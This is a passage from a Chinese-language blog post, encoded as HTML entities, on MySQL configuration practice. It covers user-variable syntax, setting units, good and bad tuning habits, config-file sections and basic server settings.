&#x88AB;&#x89C6;&#x4E3A;&#x6BD4;&#x8F83;&#x8FD0;&#x7B97;&#x7B26;&#x3002;&#x5177;&#x4F53;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x5982;&#x4E0B;&#x793A;&#x4F8B;&#xFF1A;</p><p>&#x8BE6;&#x7EC6;&#x793A;&#x4F8B;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-- @exp &#x8868;&#x793A;&#x7528;&#x6237;&#x53D8;&#x91CF;&#xFF0C;&#x4E0A;&#x9762;&#x7684;&#x793A;&#x4F8B;&#x5747;&#x662F;&#x7CFB;&#x7EDF;&#x53D8;&#x91CF;</span><br><span class="line">-- &#x9519;&#x8BEF;</span><br><span class="line"><span class="built_in">set</span> @user = 123456;</span><br><span class="line"><span class="built_in">set</span> @group = select GROUP from USER <span class="built_in">where</span> User = @user;</span><br><span class="line">select * from USER <span class="built_in">where</span> GROUP = @group;</span><br><span class="line"></span><br><span class="line">-- &#x6B63;&#x786E;</span><br><span class="line">SET @user := 123456;</span><br><span class="line">SELECT @group := `group` FROM user WHERE user = @user;</span><br><span class="line">SELECT * FROM user WHERE `group` = @group;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6709;&#x4E00;&#x4E9B;&#x914D;&#x7F6E;&#x4F7F;&#x7528;&#x4E86;&#x4E0D;&#x540C;&#x7684;&#x5355;&#x4F4D;&#xFF0C;&#x6BD4;&#x5982;table-cache&#x53D8;&#x91CF;&#x6307;&#x5B9A;&#x8868;&#x53EF;&#x4EE5;&#x88AB;&#x7F13;&#x5B58;&#x7684;&#x6570;&#x91CF;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x8868;&#x53EF;&#x4EE5;&#x88AB;&#x7F13;&#x5B58;&#x7684;&#x5B57;&#x8282;&#x6570;&#x3002;&#x800C;<code>key-buffer-size</code>&#x5219;&#x662F;&#x4EE5;&#x5B57;&#x8282;&#x4E3A;&#x5355;&#x4F4D;&#x3002;</p><p>&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x914D;&#x7F6E;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x540E;&#x7F00;&#x5355;&#x4F4D;&#xFF0C;&#x6BD4;&#x5982;1M=1024<em>1024&#x5B57;&#x8282;&#xFF0C;&#x4F46;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x8FD9;&#x53EA;&#x80FD;&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6216;&#x8005;&#x4F5C;&#x4E3A;&#x547D;&#x4EE4;&#x884C;&#x53C2;&#x6570;&#x65F6;&#x6709;&#x6548;&#x3002;&#x5F53;&#x4F7F;&#x7528; SQL &#x7684; SET &#x547D;&#x4EE4;&#x65F6;&#xFF0C;&#x5FC5;&#x987B;&#x4F7F;&#x7528;&#x6570;&#x5B57;&#x503C; 1048576 &#x6216;&#x8005; 1024</em>1024 &#x8FD9;&#x6837;&#x7684;&#x8868;&#x8FBE;&#x5F0F;&#xFF0C;&#x4F46;&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x4E0D;&#x80FD;&#x4F7F;&#x7528;&#x8868;&#x8FBE;&#x5F0F;&#x3002;</p><p><strong>&#x5C0F;&#x5FC3;&#x7FFC;&#x7FFC;&#x7684;&#x914D;&#x7F6E; MySQL</strong><br>&#x6211;&#x4EEC;&#x5E38;&#x5E38;&#x52A8;&#x6001;&#x7684;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#xFF0C;&#x4F46;&#x8BF7;&#x52A1;&#x5FC5;&#x5C0F;&#x5FC3;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x4EEC;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x6570;&#x636E;&#x5E93;&#x505A;&#x5927;&#x91CF;&#x8017;&#x65F6;&#x7684;&#x5DE5;&#x4F5C;&#xFF0C;&#x4ECE;&#x800C;&#x5F71;&#x54CD;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6574;&#x4F53;&#x6027;&#x80FD;&#x3002;&#x6BD4;&#x5982;&#x4ECE;&#x7F13;&#x5B58;&#x4E2D;&#x5237;&#x65B0;&#x810F;&#x5757;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x5237;&#x65B0;&#x65B9;&#x5F0F;&#x5BF9; I/O &#x7684;&#x5F71;&#x54CD;&#x5DEE;&#x522B;&#x5F88;&#x5927; (&#x540E;&#x6587;&#x4F1A;&#x5177;&#x4F53;&#x8BF4;&#x660E;)&#x3002;&#x6700;&#x597D;&#x628A;&#x4E00;&#x4E9B;&#x597D;&#x7684;&#x4E60;&#x60EF;&#x4F5C;&#x4E3A;&#x89C4;&#x8303;&#x5408;&#x5E76;&#x5230;&#x5DE5;&#x4F5C;&#x6D41;&#x7A0B;&#x4E2D;&#x53BB;&#xFF0C;&#x5C31;&#x6BD4;&#x5982;&#xFF1A;</p><p><strong>&#x597D;&#x4E60;&#x60EF; 1&#xFF1A;&#x4E0D;&#x8981;&#x901A;&#x8FC7;&#x914D;&#x7F6E;&#x9879;&#x7684;&#x540D;&#x79F0;&#x6765;&#x63A8;&#x65AD;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#x7684;&#x4F5C;&#x7528;</strong></p><p>&#x4E0D;&#x8981;&#x901A;&#x8FC7;&#x914D;&#x7F6E;&#x9879;&#x7684;&#x540D;&#x79F0;&#x6765;&#x63A8;&#x65AD;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#x7684;&#x4F5C;&#x7528;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x53EF;&#x80FD;&#x8DDF;&#x4F60;&#x60F3;&#x8C61;&#x7684;&#x5B8C;&#x5168;&#x4E0D;&#x4E00;&#x6837;&#x3002;&#x6BD4;&#x5982;&#xFF1A;</p><ul><li><code>read-buffer-size</code>&#xFF1A;&#x5F53; MySQL &#x9700;&#x8981;&#x987A;&#x5E8F;&#x8BFB;&#x53D6;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x5982;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#xFF0C;&#x5176;&#x5C06;&#x8FDB;&#x884C;&#x5168;&#x8868;&#x626B;&#x63CF;&#x6216;&#x8005;&#x5168;&#x7D22;&#x5F15;&#x626B;&#x63CF;&#x3002;&#x8FD9;&#x65F6;&#xFF0C;MySQL &#x6309;&#x7167;&#x6570;&#x636E;&#x7684;&#x5B58;&#x50A8;&#x987A;&#x5E8F;&#x4F9D;&#x6B21;&#x8BFB;&#x53D6;&#x6570;&#x636E;&#x5757;&#xFF0C;&#x6BCF;&#x6B21;&#x8BFB;&#x53D6;&#x7684;&#x6570;&#x636E;&#x5757;&#x9996;&#x5148;&#x4F1A;&#x6682;&#x5B58;&#x5728;&#x7F13;&#x5B58;&#x4E2D;&#xFF0C;&#x5F53;&#x7F13;&#x5B58;&#x7A7A;&#x95F4;&#x88AB;&#x5199;&#x6EE1;&#x6216;&#x8005;&#x5168;&#x90E8;&#x6570;&#x636E;&#x8BFB;&#x53D6;&#x7ED3;&#x675F;&#x540E;&#xFF0C;&#x518D;&#x5C06;&#x7F13;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x8FD4;&#x56DE;&#x7ED9;&#x4E0A;&#x5C42;&#x8C03;&#x7528;&#x8005;&#xFF0C;&#x4EE5;&#x63D0;&#x9AD8;&#x6548;&#x7387;&#x3002;</li><li><code>read-rnd-buffer-size</code>&#xFF1A;&#x548C;&#x987A;&#x5E8F;&#x8BFB;&#x53D6;&#x76F8;&#x5BF9;&#x5E94;&#xFF0C;&#x5F53; MySQL &#x8FDB;&#x884C;&#x975E;&#x987A;&#x5E8F;&#x8BFB;&#x53D6;&#xFF08;&#x968F;&#x673A;&#x8BFB;&#x53D6;&#xFF09;&#x6570;&#x636E;&#x5757;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x7F13;&#x51B2;&#x533A;&#x6682;&#x5B58;&#x8BFB;&#x53D6;&#x7684;&#x6570;&#x636E;&#x3002;&#x6BD4;&#x5982;&#xFF1A;&#x6839;&#x636E;&#x7D22;&#x5F15;&#x4FE1;&#x606F;&#x8BFB;&#x53D6;&#x8868;&#x6570;&#x636E;&#x3001;&#x6839;&#x636E;&#x6392;&#x5E8F;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x96C6;&#x4E0E;&#x8868;&#x8FDB;&#x884C; Join &#x7B49;&#x7B49;&#x3002;&#x603B;&#x7684;&#x6765;&#x8BF4;&#xFF0C;&#x5C31;&#x662F;&#x5F53;&#x6570;&#x636E;&#x5757;&#x7684;&#x8BFB;&#x53D6;&#x9700;&#x8981;&#x6EE1;&#x8DB3;&#x4E00;&#x5B9A;&#x7684;&#x987A;&#x5E8F;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;MySQL &#x5C31;&#x9700;&#x8981;&#x4EA7;&#x751F;&#x968F;&#x673A;&#x8BFB;&#x53D6;&#xFF0C;&#x8FDB;&#x800C;&#x4F7F;&#x7528;&#x5230;read-rnd-buffer-size&#x53C2;&#x6570;&#x6240;&#x8BBE;&#x7F6E;&#x7684;&#x5185;&#x5B58;&#x7F13;&#x51B2;&#x533A;&#x3002;</li></ul><p>&#x8FD9;&#x4E24;&#x4E2A;&#x914D;&#x7F6E;&#x90FD;&#x662F;&#x5728;&#x626B;&#x63CF; MyISAM &#x8868;&#x65F6;&#x6709;&#x6548;&#xFF0C;&#x4E14; MySQL &#x4F1A;&#x4E3A;&#x6BCF;&#x4E2A;&#x7EBF;&#x7A0B;&#x5206;&#x914D;&#x5185;&#x5B58;&#x3002;&#x5BF9;&#x4E8E;&#x524D;&#x8005;&#xFF0C;MySQL &#x53EA;&#x4F1A;&#x5728;&#x67E5;&#x8BE2;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x65F6;&#x624D;&#x4F1A;&#x4E3A;&#x8BE5;&#x7F13;&#x5B58;&#x5206;&#x914D;&#x5185;&#x5B58;&#xFF0C;&#x5E76;&#x4E14;&#x4E00;&#x6B21;&#x6027;&#x5206;&#x914D;&#x8BE5;&#x53C2;&#x6570;&#x6307;&#x5B9A;&#x5927;&#x5C0F;&#x7684;&#x5168;&#x90E8;&#x5185;&#x5B58;&#xFF0C;&#x800C;&#x540E;&#x8005;&#x540C;&#x6837;&#x662F;&#x9700;&#x8981;&#x65F6;&#x624D;&#x5206;&#x914D;&#x5185;&#x5B58;&#xFF0C;&#x4F46;&#x53EA;&#x5206;&#x914D;&#x9700;&#x8981;&#x7684;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x800C;&#x4E0D;&#x662F;&#x53C2;&#x6570;&#x6307;&#x5B9A;&#x7684;&#x6570;&#x503C;&#xFF0C;max-read-rnd-buffer-size(&#x5B9E;&#x9645;&#x4E0A;&#x6CA1;&#x6709;&#x8FD9;&#x4E2A;&#x914D;&#x7F6E;&#x9879;) &#x8FD9;&#x4E2A;&#x540D;&#x5B57;&#x66F4;&#x80FD;&#x8868;&#x8FBE;&#x8FD9;&#x4E2A;&#x53D8;&#x91CF;&#x7684;&#x5B9E;&#x9645;&#x542B;&#x4E49;&#x3002;</p><p><strong>&#x597D;&#x4E60;&#x60EF; 2&#xFF1A;&#x4E0D;&#x8981;&#x8F7B;&#x6613;&#x5728;&#x5168;&#x5C40;&#x4FEE;&#x6539;&#x4F1A;&#x8BDD;&#x7EA7;&#x522B;&#x7684;&#x914D;&#x7F6E;</strong></p><p>&#x5BF9;&#x4E8E;&#x67D0;&#x4E9B;&#x4F1A;&#x8BDD;&#x7EA7;&#x522B;&#x7684;&#x8BBE;&#x7F6E;&#xFF0C;&#x4E0D;&#x8981;&#x8F7B;&#x6613;&#x7684;&#x5728;&#x5168;&#x5C40;&#x589E;&#x52A0;&#x5B83;&#x4EEC;&#x7684;&#x503C;&#xFF0C;&#x9664;&#x975E;&#x4F60;&#x786E;&#x8BA4;&#x8FD9;&#x6837;&#x505A;&#x662F;&#x5BF9;&#x7684;&#x3002;&#x6BD4;&#x5982;&#xFF1A;<code>sort-buffer-size</code>&#xFF0C;&#x8BE5;&#x53C2;&#x6570;&#x63A7;&#x5236;&#x6392;&#x5E8F;&#x64CD;&#x4F5C;&#x7684;&#x7F13;&#x5B58;&#x5927;&#x5C0F;&#xFF0C;MySQL &#x53EA;&#x4F1A;&#x5728;&#x67E5;&#x8BE2;&#x9700;&#x8981;&#x505A;&#x6392;&#x5E8F;&#x64CD;&#x4F5C;&#x65F6;&#x624D;&#x4F1A;&#x4E3A;&#x8BE5;&#x7F13;&#x51B2;&#x5206;&#x914D;&#x5185;&#x5B58;&#xFF0C;&#x4E00;&#x65E6;&#x9700;&#x8981;&#x6392;&#x5E8F;&#xFF0C;&#x5C31;&#x4F1A;&#x4E00;&#x6B21;&#x6027;&#x5206;&#x914D;&#x6307;&#x5B9A;&#x5927;&#x5C0F;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x5373;&#x4F7F;&#x662F;&#x975E;&#x5E38;&#x5C0F;&#x7684;&#x6392;&#x5E8F;&#x64CD;&#x4F5C;&#x3002;&#x56E0;&#x6B64;&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x5E94;&#x8BE5;&#x914D;&#x7F6E;&#x7684;&#x5C0F;&#x4E00;&#x4E9B;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x67D0;&#x4E9B;&#x67E5;&#x8BE2;&#x9700;&#x8981;&#x6392;&#x5E8F;&#x65F6;&#xFF0C;&#x518D;&#x5728;&#x8FDE;&#x63A5;&#x4E2D;&#x628A;&#x5B83;&#x8C03;&#x5927;&#x3002;&#x6BD4;&#x5982;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SET @@seession.sort-buffer-size := &lt;value&gt;</span><br><span class="line">-- &#x6267;&#x884C;&#x67E5;&#x8BE2;&#x7684;sql</span><br><span class="line">SET @@seession.sort-buffer-size := DEFAULT -- &#x6062;&#x590D;&#x9ED8;&#x8BA4;&#x503C;</span><br><span class="line">-- &#x53EF;&#x4EE5;&#x5C06;&#x7C7B;&#x4F3C;&#x7684;&#x4EE3;&#x7801;&#x5C01;&#x88C5;&#x5728;&#x51FD;&#x6570;&#x4E2D;&#x65B9;&#x4FBF;&#x4F7F;&#x7528;&#x3002;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x597D;&#x4E60;&#x60EF; 3&#xFF1A;&#x914D;&#x7F6E;&#x53D8;&#x91CF;&#x65F6;&#xFF0C;&#x5E76;&#x4E0D;&#x662F;&#x503C;&#x8D8A;&#x5927;&#x8D8A;&#x597D;</strong><br>&#x914D;&#x7F6E;&#x53D8;&#x91CF;&#x65F6;&#xFF0C;&#x5E76;&#x4E0D;&#x662F;&#x503C;&#x8D8A;&#x5927;&#x8D8A;&#x597D;&#xFF0C;&#x800C;&#x4E14;&#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x7684;&#x503C;&#x592A;&#x9AD8;&#xFF0C;&#x53EF;&#x80FD;&#x66F4;&#x5BB9;&#x6613;&#x5BFC;&#x81F4;&#x5185;&#x5B58;&#x95EE;&#x9898;&#x3002;&#x5728;&#x4FEE;&#x6539;&#x5B8C;&#x6210;&#x540E;&#xFF0C;&#x5E94;&#x8BE5;&#x901A;&#x8FC7;&#x76D1;&#x63A7;&#x6765;&#x786E;&#x8BA4;&#x53D8;&#x91CF;&#x7684;&#x4FEE;&#x6539;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x6574;&#x4F53;&#x6027;&#x80FD;&#x7684;&#x5F71;&#x54CD;&#x3002;</p><p><strong>&#x597D;&#x4E60;&#x60EF; 4&#xFF1A;&#x89C4;&#x8303;&#x6CE8;&#x91CA;&#xFF0C;&#x7248;&#x672C;&#x63A7;&#x5236;</strong><br>&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x5199;&#x597D;&#x6CE8;&#x91CA;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x8282;&#x7701;&#x81EA;&#x5DF1;&#x548C;&#x540C;&#x4E8B;&#x5927;&#x91CF;&#x7684;&#x5DE5;&#x4F5C;&#xFF0C;&#x4E00;&#x4E2A;&#x66F4;&#x597D;&#x7684;&#x4E60;&#x60EF;&#x662F;&#x628A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7F6E;&#x4E8E;&#x7248;&#x672C;&#x63A7;&#x5236;&#x4E4B;&#x4E0B;&#x3002;</p><p>&#x8BF4;&#x5B8C;&#x4E86;&#x597D;&#x4E60;&#x60EF;&#xFF0C;&#x518D;&#x6765;&#x8BF4;&#x8BF4;&#x4E0D;&#x597D;&#x7684;&#x4E60;&#x60EF;&#x3002;</p><p><strong>&#x574F;&#x4E60;&#x60EF; 1&#xFF1A;&#x6839;&#x636E;&#x4E00;&#x4E9B; &#x201C;&#x6BD4;&#x7387;&#x201D; &#x6765;&#x8C03;&#x4F18;</strong><br>&#x4E00;&#x4E2A;&#x7ECF;&#x5178;&#x7684;&#x6309; &#x201C;&#x6BD4;&#x7387;&#x201D; &#x8C03;&#x4F18;&#x7684;&#x7ECF;&#x9A8C;&#x6CD5;&#x5219;&#x662F;&#xFF0C;&#x7F13;&#x5B58;&#x7684;&#x547D;&#x4E2D;&#x7387;&#x5E94;&#x8BE5;&#x9AD8;&#x4E8E;&#x67D0;&#x4E2A;&#x767E;&#x5206;&#x6BD4;&#xFF0C;&#x5982;&#x679C;&#x547D;&#x4E2D;&#x7387;&#x8FC7;&#x4F4E;&#xFF0C;&#x5219;&#x5E94;&#x8BE5;&#x589E;&#x52A0;&#x7F13;&#x5B58;&#x7684;&#x5927;&#x5C0F;&#x3002;&#x8FD9;&#x662F;&#x975E;&#x5E38;&#x9519;&#x8BEF;&#x7684;&#x610F;&#x89C1;&#xFF0C;&#x5927;&#x5BB6;&#x53EF;&#x4EE5;&#x4ED4;&#x7EC6;&#x601D;&#x8003;&#x4E00;&#x4E0B;&#xFF1A;&#x7F13;&#x5B58;&#x7684;&#x547D;&#x4E2D;&#x7387;&#x8DDF;&#x7F13;&#x5B58;&#x5927;&#x5C0F;&#x6709;&#x5FC5;&#x7136;&#x8054;&#x7CFB;&#x5417;&#xFF1F;(&#x5206;&#x6BCD;&#x53D8;&#x5927;&#xFF0C;&#x503C;&#x5C31;&#x53D8;&#x5927;&#x4E86;&#xFF1F;) &#x9664;&#x975E;&#x786E;&#x5B9E;&#x662F;&#x7F13;&#x5B58;&#x592A;&#x5C0F;&#x4E86;&#x3002;&#x5173;&#x4E8E; MyISAM &#x952E;&#x7F13;&#x51B2;&#x547D;&#x4E2D;&#x7387;&#xFF0C;&#x4E0B;&#x6587;&#x4F1A;&#x8BE6;&#x7EC6;&#x8BF4;&#x660E;&#x3002;</p><p><strong>&#x574F;&#x4E60;&#x60EF; 2&#xFF1A;&#x968F;&#x4FBF;&#x4F7F;&#x7528;&#x8C03;&#x4F18;&#x811A;&#x672C;</strong><br>&#x5C3D;&#x91CF;&#x4E0D;&#x8981;&#x4F7F;&#x7528;&#x8C03;&#x4F18;&#x811A;&#x672C;&#xFF01;&#x4E0D;&#x540C;&#x7684;&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x3001;&#x4E0D;&#x540C;&#x7684;&#x786C;&#x4EF6;&#x73AF;&#x5883;&#x5BF9; MySQL &#x7684;&#x6027;&#x80FD;&#x8981;&#x6C42;&#x662F;&#x4E0D;&#x4E00;&#x6837;&#x7684;&#x3002;&#x6BD4;&#x5982;&#x6709;&#x4E9B;&#x4E1A;&#x52A1;&#x5BF9;&#x6570;&#x636E;&#x7684;&#x5B8C;&#x6574;&#x6027;&#x8981;&#x6C42;&#x8F83;&#x9AD8;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4E00;&#x5B9A;&#x8981;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x4E0D;&#x4E22;&#x5931;&#xFF0C;&#x51FA;&#x73B0;&#x6545;&#x969C;&#x540E;&#x53EF;&#x6062;&#x590D;&#x6570;&#x636E;&#xFF0C;&#x800C;&#x6709;&#x4E9B;&#x4E1A;&#x52A1;&#x5374;&#x5BF9;&#x6570;&#x636E;&#x7684;&#x5B8C;&#x6574;&#x6027;&#x8981;&#x6C42;&#x6CA1;&#x90A3;&#x4E48;&#x9AD8;&#xFF0C;&#x4F46;&#x5BF9;&#x6027;&#x80FD;&#x8981;&#x6C42;&#x66F4;&#x9AD8;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x5373;&#x4F7F;&#x662F;&#x540C;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;&#x5728;&#x8FD9;&#x4E24;&#x4E2A;&#x4E0D;&#x540C;&#x573A;&#x666F;&#x4E0B;&#xFF0C;&#x5176;&#x914D;&#x7F6E;&#x7684;&#x503C;&#x4E5F;&#x5E94;&#x8BE5;&#x662F;&#x4E0D;&#x540C;&#x7684;&#x3002;&#x90A3;&#x4F60;&#x8FD8;&#x80FD;&#x653E;&#x5FC3;&#x7684;&#x4F7F;&#x7528;&#x7F51;&#x4E0A;&#x627E;&#x5230;&#x7684;&#x811A;&#x672C;&#x5417; &#xFF1F;</p><blockquote><p>&#x672C;&#x5C0F;&#x8282;&#x793A;&#x4F8B;&#x7684;&#x51E0;&#x4E2A;&#x914D;&#x7F6E;&#x9879;&#xFF0C;&#x4EC5;&#x7528;&#x4E8E;&#x4E3E;&#x4F8B;&#x8BF4;&#x660E;&#xFF0C;&#x5E76;&#x4E0D;&#x4EE3;&#x8868;&#x5B83;&#x4EEC;&#x6709;&#x591A;&#x4E48;&#x91CD;&#x8981;&#xFF0C;&#x8BF7;&#x6839;&#x636E;&#x5B9E;&#x9645;&#x5E94;&#x7528;&#x573A;&#x666F;&#x914D;&#x7F6E;&#x5B83;&#x4EEC;&#x3002;&#x5C31;&#x6BD4;&#x5982;<code>sort-buffer-size</code>&#xFF0C;&#x4F60;&#x771F;&#x7684;&#x9700;&#x8981; 100M &#x5185;&#x5B58;&#x6765;&#x7F13;&#x5B58; 10 &#x884C;&#x6570;&#x636E;&#xFF1F;</p></blockquote><h4 id="&#x5206;&#x6BB5;"><a href="#&#x5206;&#x6BB5;" class="headerlink" title="&#x5206;&#x6BB5;"></a>&#x5206;&#x6BB5;</h4><p>MySQL &#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x683C;&#x5F0F;&#x4E3A;&#x96C6;&#x4E2D;&#x5F0F;&#xFF0C;&#x901A;&#x5E38;&#x4F1A;&#x5206;&#x6210;&#x597D;&#x51E0;&#x90E8;&#x5206;&#xFF0C;&#x53EF;&#x4EE5;&#x4E3A;&#x591A;&#x4E2A;&#x7A0B;&#x5E8F;&#x63D0;&#x4F9B;&#x914D;&#x7F6E;&#xFF0C;&#x5982;<code>[client]</code>&#x3001;<code>[mysqld]</code>&#x3001;<code>[mysql]</code>&#x7B49;&#x7B49;&#x3002;MySQL &#x7A0B;&#x5E8F;&#x901A;&#x5E38;&#x662F;&#x8BFB;&#x53D6;&#x4E0E;&#x5B83;&#x540C;&#x540D;&#x7684;&#x5206;&#x6BB5;&#x90E8;&#x5206;&#x3002;</p><ul><li><code>[client]</code>&#x5BA2;&#x6237;&#x7AEF;&#x9ED8;&#x8BA4;&#x8BBE;&#x7F6E;&#x5185;&#x5BB9;</li><li><code>[mysql]</code>&#x4F7F;&#x7528; mysql &#x547D;&#x4EE4;&#x767B;&#x5F55; MySQL &#x6570;&#x636E;&#x5E93;&#x65F6;&#x7684;&#x9ED8;&#x8BA4;&#x8BBE;&#x7F6E;</li><li><code>[mysqld]</code>&#x6570;&#x636E;&#x5E93;&#x672C;&#x8EAB;&#x7684;&#x9ED8;&#x8BA4;&#x8BBE;&#x7F6E;</li></ul><p>&#x4F8B;&#x5982;&#x670D;&#x52A1;&#x5668; mysqld &#x901A;&#x5E38;&#x8BFB;&#x53D6;<code>[mysqld]</code>&#x5206;&#x6BB5;&#x4E0B;&#x7684;&#x76F8;&#x5173;&#x914D;&#x7F6E;&#x9879;&#x3002;&#x5982;&#x679C;&#x914D;&#x7F6E;&#x9879;&#x4F4D;&#x7F6E;&#x4E0D;&#x6B63;&#x786E;&#xFF0C;&#x8BE5;&#x914D;&#x7F6E;&#x662F;&#x4E0D;&#x4F1A;&#x751F;&#x6548;&#x7684;&#x3002;</p><h4 id="GENERAL"><a href="#GENERAL" class="headerlink" title="GENERAL"></a>GENERAL</h4><p>&#x9996;&#x5148;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7528;&#x6237; mysql &#x6765;&#x8FD0;&#x884C; mysqld &#x8FDB;&#x7A0B;&#xFF0C;&#x8BF7;&#x786E;&#x4FDD;&#x8FD9;&#x4E2A;&#x7528;&#x6237;&#x62E5;&#x6709;&#x64CD;&#x4F5C;&#x6570;&#x636E;&#x76EE;&#x5F55;&#x7684;&#x6743;&#x9650;&#x3002;&#x8BBE;&#x7F6E;&#x9ED8;&#x8BA4;&#x7AEF;&#x53E3;&#x4E3A; 3306&#xFF0C;&#x6709;&#x65F6;&#x4E3A;&#x4E86;&#x5B89;&#x5168;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x4FEE;&#x6539;&#x4E00;&#x4E0B;&#x3002;&#x9ED8;&#x8BA4;&#x9009;&#x62E9; Innodb &#x5B58;&#x50A8;&#x5F15;&#x64CE;&#xFF0C;&#x5728;&#x5927;&#x591A;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#x662F;&#x6700;&#x597D;&#x7684;&#x9009;&#x62E9;&#x3002;&#x4F46;&#x5982;&#x679C;&#x9ED8;&#x8BA4;&#x662F; InnoDB&#xFF0C;&#x5374;&#x9700;&#x8981;&#x4F7F;&#x7528; MyISAM &#x5B58;&#x50A8;&#x5F15;&#x64CE;&#xFF0C;&#x8BF7;&#x663E;&#x5F0F;&#x5730;&#x8FDB;&#x884C;&#x914D;&#x7F6E;&#x3002;&#x8BB8;&#x591A;&#x7528;&#x6237;&#x8BA4;&#x4E3A;&#x5176;&#x6570;&#x636E;&#x5E93;&#x4F7F;&#x7528;&#x4E86;&#x67D0;&#x79CD;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x4F46;&#x5B9E;&#x9645;&#x4E0A;&#x5374;&#x4F7F;&#x7528;&#x7684;&#x662F;&#x53E6;&#x5916;&#x4E00;&#x79CD;&#xFF0C;&#x5C31;&#x662F;&#x56E0;&#x4E3A;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x7684;&#x95EE;&#x9898;&#x3002;</p><p>&#x63A5;&#x7740;&#x8BBE;&#x7F6E;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x8FD9;&#x91CC;&#x628A; pid &#x6587;&#x4EF6;&#x548C; socket &#x6587;&#x4EF6;&#x653E;&#x5230;&#x76F8;&#x540C;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x5F53;&#x7136;&#x4E5F;&#x53EF;&#x4EE5;&#x9009;&#x62E9;&#x5176;&#x5B83;&#x4F4D;&#x7F6E;&#xFF0C;&#x4F46;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#x4E0D;&#x8981;&#x5C06; socket &#x6587;&#x4EF6;&#x548C; pid &#x6587;&#x4EF6;&#x653E;&#x5230; MySQL &#x7F16;&#x8BD1;&#x7684;&#x9ED8;&#x8BA4;&#x4F4D;&#x7F6E;&#xFF0C;&#x56E0;&#x4E3A;&#x4E0D;&#x540C;&#x7248;&#x672C;&#x7684; MySQL&#xFF0C;&#x8FD9;&#x4E24;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x9ED8;&#x8BA4;&#x8DEF;&#x5F84;&#x53EF;&#x80FD;&#x4F1A;&#x4E0D;&#x4E00;&#x81F4;&#xFF0C;&#x6700;&#x597D;&#x660E;&#x786E;&#x5730;&#x8BBE;&#x7F6E;&#x8FD9;&#x4E9B;&#x6587;&#x4EF6;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x4EE5;&#x514D;&#x7248;&#x672C;&#x5347;&#x7EA7;&#x65F6;&#x51FA;&#x73B0;&#x95EE;&#x9898;&#x3002;</p><blockquote><p>&#x5728;&#x7C7B; UNIX &#x7CFB;&#x7EDF;&#x4E0B;&#x672C;&#x5730;&#x8FDE;&#x63A5; MySQL &#x53EF;&#x4EE5;&#x91C7;&#x7528; UNIX &#x57DF;&#x5957;&#x63A5;&#x5B57;&#x65B9;&#x5F0F;&#xFF0C;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x5957;&#x63A5;&#x5B57;&#xFF08;socket&#xFF09;&#x6587;&#x4EF6;&#xFF0C;&#x5373;&#x914D;&#x7F6E;&#x4E2D;&#x7684;mysql.sock&#x6587;&#x4EF6;&#x3002;</p></blockquote><blockquote><p>&#x5F53; MySQL 